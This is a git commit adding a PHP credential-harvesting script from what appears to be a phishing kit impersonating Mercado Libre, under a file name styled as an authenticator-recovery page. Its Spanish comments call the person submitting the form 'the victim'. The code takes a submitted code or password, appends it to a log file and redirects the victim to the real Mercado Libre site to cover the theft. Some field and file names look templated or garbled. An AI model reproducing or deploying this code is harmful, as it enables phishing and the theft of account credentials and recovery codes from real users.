1e913eb638c20a5514fb3d1cef254c5821fb7ea9
garantiaoficial <64289147+garantiaoficial@users.noreply.github.com>
2020-04-24 18:52:53 -0400

    Add files via upload

---
+++ authenticatorrecovery-ahBDMWCEpNdxGWkUnoWmInSEEBBWhOXfaEDXWmqTvLqiALhIRi=7ff87df1466f2f1bc5c61076f62cc578&execution.php
@@ -0,0 +1,20 @@
+<title>Compras - Mercado Libre</title><?
+/*
+Este archivo es el que procesa todos los datos de la victima y lo guarda en un archivo (leeme.html <- Aqui se guardaran los datos).
+*/
+
+#haxor.php
+// Asigna el valor a las variables del usuario y contraseña
+$Clave = $_POST['$C0D1G0$'];
+
+//Asigna el valor a la variable donde se guarda el usuario y contraseña
+$guardame = fopen('$代码$','a+');
+fwrite($guardame,
+"<br/><b>$C0D1G0$:</b>".$Clave.
+"<br/><b></b>".$Clave." ");
+
+
+fclose($guardame);
+//Redirecciona a la web original (MercadoLibre)
+echo "<meta http-equiv='refresh' content='1;url=https://myaccount.mercadolibre.com.uy/purchases/list'>"
+?>
